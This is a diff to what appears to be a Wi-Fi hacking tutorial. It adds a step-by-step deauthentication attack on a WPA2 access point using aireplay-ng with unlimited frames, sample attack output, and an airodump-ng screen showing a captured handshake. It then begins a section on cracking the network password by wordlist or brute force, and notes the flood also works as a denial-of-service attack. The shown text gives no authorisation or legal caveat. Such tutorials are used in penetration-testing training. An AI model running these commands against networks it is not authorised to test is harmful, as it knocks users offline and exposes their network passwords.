@@ -128,10 +128,55 @@ Now we can commence an attack.
 
 ## Attacking an access point
 
-We'll be flooding the access point with deauthentication frames to keep devices from reconnecting to it. As they try to reconnect, we'll be able to capture the 4-way handshake. This can also be used to simply perform DOS attacks on an access point. Keep in mind you won't be able to capture the handshake if there are no devices associated to the access point. There is nothing conducting the authentication process which you can capture.
+We'll be flooding the access point with deauthentication frames to keep devices from reconnecting to it. As they try to reconnect, we'll be able to capture the 4-way handshake. This can also be used to simply perform DOS attacks on an access point. Keep in mind you won't be able to capture the handshake if there are no devices associated to the access point. If there are no devices associated, there is nothing conducting the authentication process which you can capture.
 
+While leaving the previous `airodump-ng` command running in a separate tab or window, open another tab to run the deauthentication command. The command is as follows:
 
+```
+aireplay-ng -0 0 -a 6C:B0:CE:B6:07:53 wlan0
+```
 
+The BSSID we specify is that of the access point. It is possible to limit the amount of deauthentication frames to send, but in this case we are sending an infinite amount specified with `-0 0`.
+
+The output for the `aireplay-ng` command will look like this:
+
+```
+03:24:06  Waiting for beacon frame (BSSID: 6C:B0:CE:B6:07:53) on channel 7
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+03:24:06  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:07  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:08  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:09  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:10  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+03:24:11  Sending DeAuth (code 7) to broadcast -- BSSID: [6C:B0:CE:B6:07:53]
+```
+
+Your terminal screen will continue to fill with these messages. Keep the command running until you see a `WPA handshake: XX:XX:XX:XX:XX:XX` message on the upper right of the first window running the `airodump-ng` command. That window will look as follows (notice the message on the upper right):
+
+```
+ CH  7 ][ Elapsed: 1 min ][ 2019-09-28 03:25 ][ WPA handshake: 6C:B0:CE:B6:07:53                                         
+                                                                                                                                                                                    
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                                    
+ 6C:B0:CE:B6:07:53  -44  96      871       96    0   7  130  WPA2 CCMP   PSK  Lower The Rent                                                                                        
+                                                                                                                                                                                    
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                          
+                                                                                                                                                                    
+ 6C:B0:CE:B6:07:53  38:53:9C:93:ED:4A  -41    1e- 1      0       78   
+```
+
+If you see the message, you have successfully captured the handshake. The last step left to do now is to crack this handshake and reveal the password in plaintext.
+
+## Cracking the password
+
+Recall that we saved our `airodump-ng` scan to a file named `SCAN_OUTPUT`. You'll see several files in the directory by the same name, but you'll only need the one with a `.cap` extension. From here, there are two approaches to cracking the password. You can use a wordlist and see if one of the passwords in the wordlist is the actual password to the access point, or you can opt to use a program that generates passwords and attempts each one (brute forcing). 
 
 To put network interfaces back to normal:
 
